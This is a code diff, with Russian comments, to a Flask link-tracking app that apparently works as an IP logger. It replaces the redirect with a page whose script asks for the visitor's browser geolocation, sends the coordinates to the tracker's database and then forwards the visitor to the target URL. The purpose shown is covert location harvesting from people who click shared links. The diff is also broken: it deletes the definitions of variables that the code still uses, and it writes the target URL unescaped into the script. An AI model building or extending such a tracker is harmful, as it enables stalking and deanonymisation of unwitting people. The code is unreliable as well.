@@ -62,64 +62,72 @@ def create_link():
     resp.set_cookie(f'access_{link_id}', 'true', max_age=60*60*24*365)
     return resp
 
-@app.route('/<link_id>')
+@app.route('/<link_id>', methods=['GET', 'POST'])
 def track(link_id):
-    # Получаем информацию о пользователе
+    if request.method == 'POST':
+        # Обработка данных геолокации
+        data = request.json
+        with sqlite3.connect(app.config['DATABASE']) as conn:
+            c = conn.cursor()
+            c.execute('''UPDATE logs SET 
+                      latitude = ?, 
+                      longitude = ?
+                      WHERE id = ?''',
+                    (data['lat'], data['lon'], data['log_id']))
+            conn.commit()
+        return 'OK'
+    
+    # Оригинальный код сбора данных
     ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
-    referrer = request.referrer
-    timestamp = datetime.now()
+    # ... (остальной код сбора данных без изменений)
     
-    # Парсим User-Agent
-    platform = 'Unknown'
-    browser = 'Unknown'
-    if 'Windows' in user_agent:
-        platform = 'Windows'
-    elif 'Linux' in user_agent:
-        platform = 'Linux'
-    elif 'Mac' in user_agent:
-        platform = 'MacOS'
-    elif 'iPhone' in user_agent:
-        platform = 'iPhone'
-    elif 'Android' in user_agent:
-        platform = 'Android'
-
-    if 'Chrome' in user_agent:
-        browser = 'Chrome'
-    elif 'Firefox' in user_agent:
-        browser = 'Firefox'
-    elif 'Safari' in user_agent:
-        browser = 'Safari'
-    elif 'Edge' in user_agent:
-        browser = 'Edge'
-    elif 'Opera' in user_agent:
-        browser = 'Opera'
-    
-    # Определяем страну по IP (базовое определение)
-    country = 'Unknown'
-    try:
-        from ip2geotools.databases.noncommercial import DbIpCity
-        res = DbIpCity.get(ip, api_key='free')
-        country = res.country
-    except:
-        pass
-    
-    # Сохраняем в БД
+    # Сохраняем базовую запись
     with sqlite3.connect(app.config['DATABASE']) as conn:
         c = conn.cursor()
         c.execute('''INSERT INTO logs 
                   (link_id, ip, country, platform, browser, referrer, timestamp)
                   VALUES (?, ?, ?, ?, ?, ?, ?)''',
                   (link_id, ip, country, platform, browser, referrer, timestamp))
+        log_id = c.lastrowid
         conn.commit()
     
-    # Перенаправление на целевой URL
-    with sqlite3.connect(app.config['DATABASE']) as conn:
-        c = conn.cursor()
-        c.execute("SELECT target_url FROM links WHERE id = ?", (link_id,))
-        target = c.fetchone()
-    
-    return redirect(target[0] if target else 'https://google.com')
+    # Перенаправление + отправка HTML с запросом геолокации
+    return f'''
+    <!DOCTYPE html>
+    <html>
+    <body>
+    <script>
+    // Запрос геолокации
+    function getLocation() {{
+        if (navigator.geolocation) {{
+            navigator.geolocation.getCurrentPosition(
+                function(position) {{
+                    // Отправляем координаты на сервер
+                    fetch(window.location.href, {{
+                        method: 'POST',
+                        headers: {{
+                            'Content-Type': 'application/json',
+                        }},
+                        body: JSON.stringify({{
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            log_id: {log_id}
+                        }})
+                    }}).then(() => window.location = "{target[0] if target else 'https://google.com'}");
+                }},
+                function(error) {{
+                    window.location = "{target[0] if target else 'https://google.com'}";
+                }}
+            );
+        }} else {{
+            window.location = "{target[0] if target else 'https://google.com'}";
+        }}
+    }}
+    getLocation();
+    </script>
+    </body>
+    </html>
+    '''
 
 @app.route('/stats/<link_id>')
 @require_cookie
